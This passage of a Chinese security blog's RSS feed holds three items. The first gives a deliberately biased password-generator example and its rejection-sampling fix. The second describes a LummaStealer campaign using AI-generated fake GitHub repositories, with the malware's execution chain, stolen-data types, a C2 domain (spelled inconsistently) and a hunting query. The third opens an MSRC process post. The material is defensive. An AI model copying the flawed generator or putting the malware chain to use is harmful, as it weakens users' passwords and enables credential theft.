&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/* 存在模偏差的示例，切勿使用 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;generatePassword&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;characters&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz~!@-#$&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;Array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;crypto&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getRandomValues&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Uint32Array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;characters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;characters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;当随机数范围不是字符集大小的整数倍时，会导致某些字符出现概率更高。&lt;/p&gt;
&lt;h2 id=&#34;正确实现方案&#34;&gt;正确实现方案
&lt;/h2&gt;&lt;h3 id=&#34;拒绝采样技术&#34;&gt;拒绝采样技术
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;simplesecpw&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pwlen&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pwchars&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pwchars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;randval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pwlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;randval&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;crypto&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getRandomValues&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Uint8Array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;randval&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pwchars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;randval&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pwchars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该方案实现了三个关键安全要素：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用密码学安全的&lt;code&gt;crypto.getRandomValues()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;避免浮点数运算&lt;/li&gt;
&lt;li&gt;通过拒绝采样消除模偏差&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;技术原理详解&#34;&gt;技术原理详解
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;密码学安全随机数&lt;/strong&gt;：现代操作系统都内置了密码学安全随机数生成器，浏览器通过Web Crypto API暴露该功能。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;模偏差问题&lt;/strong&gt;：当随机数范围(256)不是字符集大小(62)的整数倍时，直接取模会导致某些字符出现概率更高。例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;小写字母&amp;quot;a&amp;quot;对应5个值(0,62,124,186,248)&lt;/li&gt;
&lt;li&gt;大写字母&amp;quot;A&amp;quot;只对应4个值(26,88,150,212)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;拒绝采样&lt;/strong&gt;：通过丢弃会导致偏差的随机值(≥limit)，确保剩余值能均匀分布。虽然理论上可能导致延迟，但实际影响可忽略不计。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;实际应用&#34;&gt;实际应用
&lt;/h2&gt;&lt;p&gt;本文提供的代码已发布在0BSD许可下，包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基础版：固定15字符长度，包含字母和数字&lt;/li&gt;
&lt;li&gt;可配置版：支持自定义长度和字符集&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在线演示地址：https://password.hboeck.de/
GitHub仓库：包含完整实现代码&lt;/p&gt;
</description>
        </item>
        <item>
        <title>AI生成虚假GitHub仓库传播SmartLoader和LummaStealer恶意软件</title>
        <link>http://localhost:1313/p/ai%E7%94%9F%E6%88%90%E8%99%9A%E5%81%87github%E4%BB%93%E5%BA%93%E4%BC%A0%E6%92%ADsmartloader%E5%92%8Clummastealer%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/</link>
        <pubDate>Sat, 02 Aug 2025 22:33:52 +0800</pubDate>
        
        <guid>http://localhost:1313/p/ai%E7%94%9F%E6%88%90%E8%99%9A%E5%81%87github%E4%BB%93%E5%BA%93%E4%BC%A0%E6%92%ADsmartloader%E5%92%8Clummastealer%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/</guid>
        <description>&lt;h2 id=&#34;技术分析&#34;&gt;技术分析
&lt;/h2&gt;&lt;h3 id=&#34;攻击链概述&#34;&gt;攻击链概述
&lt;/h3&gt;&lt;p&gt;趋势科技威胁狩猎团队发现新型攻击活动，攻击者创建AI生成的虚假GitHub仓库，伪装成以下类型项目：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;游戏外挂程序&lt;/li&gt;
&lt;li&gt;软件破解工具&lt;/li&gt;
&lt;li&gt;加密货币工具&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;lua51.dll&lt;/code&gt; - LuaJIT运行时解释器&lt;/li&gt;
&lt;li&gt;&lt;code&gt;luajit.exe&lt;/code&gt; - Lua加载器可执行文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;userdata.txt&lt;/code&gt; - 恶意Lua脚本（经混淆处理）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Launcher.bat&lt;/code&gt; - 执行批处理脚本&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;技术演进对比&#34;&gt;技术演进对比
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;特征&lt;/th&gt;
          &lt;th&gt;2024年10月旧活动&lt;/th&gt;
          &lt;th&gt;2025年新活动&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;托管方式&lt;/td&gt;
          &lt;td&gt;GitHub文件附件&lt;/td&gt;
          &lt;td&gt;GitHub Releases板块&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;诱导手段&lt;/td&gt;
          &lt;td&gt;仿冒下载页面&lt;/td&gt;
          &lt;td&gt;AI生成仓库文档&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;载荷传递&lt;/td&gt;
          &lt;td&gt;直接下载&lt;/td&gt;
          &lt;td&gt;多阶段Lua脚本执行链&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;载荷执行流程&#34;&gt;载荷执行流程
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;受害者执行Launcher.bat触发luajit.exe&lt;/li&gt;
&lt;li&gt;加载器从GitHub获取加密文件（l.txt/lmd.txt）&lt;/li&gt;
&lt;li&gt;重命名为search.exe/debug.lua后执行&lt;/li&gt;
&lt;li&gt;通过AutoIT脚本释放LummaStealer&lt;/li&gt;
&lt;li&gt;连接C2服务器（pasteflawwed[.]world）&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;窃取数据类型&#34;&gt;窃取数据类型
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;浏览器凭证与Cookie&lt;/li&gt;
&lt;li&gt;加密货币钱包文件&lt;/li&gt;
&lt;li&gt;2FA扩展数据（如Authenticator）&lt;/li&gt;
&lt;li&gt;系统敏感信息（PII）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;防御建议&#34;&gt;防御建议
&lt;/h2&gt;&lt;h3 id=&#34;企业防护措施&#34;&gt;企业防护措施
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;1.&lt;/span&gt; 终端防护：
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; 部署具备行为检测的EDR解决方案
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; 启用应用程序控制策略（阻止非授权脚本）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;2.&lt;/span&gt; 网络防护：
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; 阻断已知恶意GitHub域名
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; 监控异常9222端口调试流量
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;3.&lt;/span&gt; 威胁狩猎：
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ```hunting_query
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   eventSubId:301 AND processFilePath:Research.com 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   AND hostName:pasteflawded.world
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;### 个人防护要点
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- 验证仓库真实性（检查commit历史/贡献者）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- 使用沙箱环境检测可疑文件
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- 避免下载&amp;#34;灰色&amp;#34;软件（破解/外挂工具）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;## 威胁指标(IoC)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- C2域名：pasteflawded[.]world
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- 文件哈希：详见趋势科技官方IoC列表
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- AutoIT载荷路径：`%TEMP%\Research.com`
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; 该活动显示攻击者正将AI技术与传统代码混淆（Lua/Prometheus混淆器）相结合，滥用开发平台信誉实施供应链攻击。建议结合威胁情报进行主动防御。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>安全更新程序剖析：微软安全响应中心的内部流程解析</title>
        <link>http://localhost:1313/p/%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E7%A8%8B%E5%BA%8F%E5%89%96%E6%9E%90%E5%BE%AE%E8%BD%AF%E5%AE%89%E5%85%A8%E5%93%8D%E5%BA%94%E4%B8%AD%E5%BF%83%E7%9A%84%E5%86%85%E9%83%A8%E6%B5%81%E7%A8%8B%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 22:22:33 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E7%A8%8B%E5%BA%8F%E5%89%96%E6%9E%90%E5%BE%AE%E8%BD%AF%E5%AE%89%E5%85%A8%E5%93%8D%E5%BA%94%E4%B8%AD%E5%BF%83%E7%9A%84%E5%86%85%E9%83%A8%E6%B5%81%E7%A8%8B%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;p&gt;本博客是《Anatomy of a Security Update》的日文翻译版。最新信息请参考原文。&lt;/p&gt;
&lt;p&gt;微软安全响应中心作为防御社区的一部分，始终站在客户与公司安全响应的最前线。我们的使命是保护客户和微软免受当前及未来新型安全与隐私威胁。通过持续监控威胁态势，为组织提供防御、识别和修复攻击的最新工具与指南。&lt;/p&gt;
&lt;p&gt;我们经常被问到：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;为什么微软不能更快发布安全更新？&lt;/li&gt;
&lt;li&gt;为什么发现零日漏洞后不能立即发布补丁？&lt;/li&gt;
&lt;li&gt;为什么要依赖协调漏洞披露？
这些都是很好的问题。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;安全更新的生命周期&#34;&gt;安全更新的生命周期
&lt;/h3&gt;&lt;p&gt;&amp;ldquo;安全更新的开发需要在质量与时效性之间取得微妙平衡。我们必须考虑如何最小化客户干扰，同时最大化保护效果。&amp;rdquo; ——微软安全响应中心副总裁 Aanchal Gupta&lt;/p&gt;
